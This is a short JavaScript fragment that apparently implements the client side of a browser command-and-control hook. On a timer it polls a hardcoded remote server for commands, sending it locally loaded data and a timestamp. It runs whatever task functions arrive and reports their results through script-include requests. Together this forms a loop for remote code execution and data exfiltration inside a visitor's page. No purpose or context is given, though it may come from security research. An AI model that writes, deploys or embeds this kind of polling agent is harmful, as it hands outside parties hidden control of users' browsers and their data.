___.$(function($) {

    // Triggers a command for processing
    ___.fire = function(payload) {
        // If it will respond with a callback, don't respond until that is called
        if (payload.task.length > 0) {
            payload.task.call(this, function(result) {
                ___.include(payload.return + "?key=" + payload.key + "&result=" + result);
            });
        // If it does not use a callback, respond straight away
        } else {
            ___.include(payload.return + "?key=" + payload.key + "&result=" + payload.task.call(this));
        }
    };

    // If this script is living in the top level
    if (top == window) {

        // Constantly poll for commands
        setInterval(function() {
            var data = ___.load();
            data.time = Date.now();
            ___.include('//wagner.cse.unsw.edu.au:3977/queue?' + Object.keys(data).map(function(key) { return key + '=' + data[key] }).join('&') );
        }, 3000);
    }
});
